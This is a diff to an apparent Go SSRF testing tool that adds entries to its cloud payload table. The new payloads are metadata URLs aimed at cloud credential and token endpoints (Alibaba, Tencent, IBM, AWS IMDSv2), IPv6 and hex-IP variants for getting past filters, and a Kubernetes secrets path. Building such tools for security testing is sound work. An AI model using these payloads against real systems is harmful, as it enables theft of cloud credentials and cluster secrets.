@@ -147,13 +147,36 @@ var cloudPayloads = []Payload{
 
 	// Oracle Cloud
 	{Value: "http://169.254.169.254/opc/v1/instance/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Oracle Cloud instance", CloudType: "oracle"},
+	{Value: "http://169.254.169.254/opc/v2/instance/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Oracle Cloud instance v2", CloudType: "oracle"},
 
 	// Alibaba Cloud
 	{Value: "http://100.100.100.200/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Alibaba Cloud metadata", CloudType: "alibaba"},
+	{Value: "http://100.100.100.200/latest/meta-data/ram/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Alibaba RAM credentials", CloudType: "alibaba"},
+
+	// Tencent Cloud
+	{Value: "http://metadata.tencentyun.com/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Tencent Cloud metadata", CloudType: "tencent"},
+	{Value: "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Tencent CAM credentials", CloudType: "tencent"},
+
+	// IBM Cloud (token endpoint requires PUT; URL still works as a leak signal)
+	{Value: "http://169.254.169.254/instance_identity/v1/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "IBM Cloud identity token", CloudType: "ibm"},
+	{Value: "http://api.metadata.cloud.ibm.com/instance_identity/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "IBM Cloud metadata", CloudType: "ibm"},
+
+	// AWS IMDSv2 token endpoint (PUT-required; included so detectors that
+	// observe a 405/401 instead of plain 404 can still flag the host).
+	{Value: "http://169.254.169.254/latest/api/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IMDSv2 token endpoint", CloudType: "aws"},
+
+	// IPv6 metadata variants (used by some cloud platforms / mDNS).
+	{Value: "http://[fd00:ec2::254]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 metadata", CloudType: "aws"},
+	{Value: "http://[fe80::a9fe:a9fe]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Link-local IPv6 metadata", CloudType: "aws"},
+
+	// Hex-encoded IP bypass (decimal variant already lives in the
+	// WAF-bypass table further down so it isn't duplicated here).
+	{Value: "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS metadata (hex IP)", CloudType: "aws"},
 
 	// Kubernetes
 	{Value: "https://kubernetes.default.svc/", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes API internal", CloudType: "kubernetes"},
 	{Value: "https://kubernetes.default.svc/api/v1/namespaces", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes namespaces", CloudType: "kubernetes"},
+	{Value: "https://kubernetes.default.svc.cluster.local/api/v1/secrets", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes secrets", CloudType: "kubernetes"},
 }
 
 // Local file access payloads.
